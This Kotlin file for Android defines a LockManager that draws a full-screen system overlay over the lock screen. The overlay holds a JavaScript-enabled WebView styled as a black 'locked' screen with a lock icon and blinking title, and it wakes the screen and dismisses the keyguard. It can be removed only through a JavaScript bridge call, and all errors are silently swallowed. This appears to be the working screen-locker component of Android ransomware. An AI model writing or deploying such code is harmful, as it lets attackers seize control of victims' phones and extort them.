package com.example.malzguard

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.view.Gravity
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

object LockManager {
    private var view: FrameLayout? = null
    private var wm: WindowManager? = null

    fun isLocked(): Boolean = view != null

    fun show(ctx: Context, html: String) {
        try {
            hide(ctx)
            val w = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            wm = w
            val root = FrameLayout(ctx)
            val web = WebView(ctx)
            web.settings.javaScriptEnabled = true
            web.webViewClient = WebViewClient()
            web.addJavascriptInterface(Bridge(ctx), "Native")
            web.loadDataWithBaseURL(null, wrapHtml(html), "text/html", "utf-8", null)
            root.addView(web, FrameLayout.LayoutParams(-1, -1))
            val type = if (Build.VERSION.SDK_INT >= 26) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )
            lp.gravity = Gravity.TOP or Gravity.START
            w.addView(root, lp)
            view = root
        } catch (e: Exception) {}
    }

    fun hide(ctx: Context) {
        try { view?.let { wm?.removeView(it) } } catch (e: Exception) {}
        view = null
    }

    private fun wrapHtml(body: String): String {
        if (body.trim().startsWith("<html")) return body
        return """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden;user-select:none;-webkit-user-select:none}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(255,255,255,.03) 0px,rgba(255,255,255,.03) 1px,transparent 1px,transparent 3px);pointer-events:none;animation:scan 8s linear infinite}
@keyframes scan{to{background-position:0 100px}}
.box{text-align:center;max-width:500px;position:relative;z-index:2}
h1{font-size:28px;letter-spacing:4px;margin-bottom:16px;animation:blink 1.5s infinite}
p{font-size:13px;color:#888;letter-spacing:2px;line-height:1.8}
.lock-icon{font-size:60px;margin-bottom:20px;animation:pulse 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
</style></head><body><div class="box">$body</div></body></html>"""
    }

    private class Bridge(val ctx: Context) {
        @JavascriptInterface
        fun unlock() {
            try { hide(ctx) } catch (e: Exception) {}
        }
    }
}
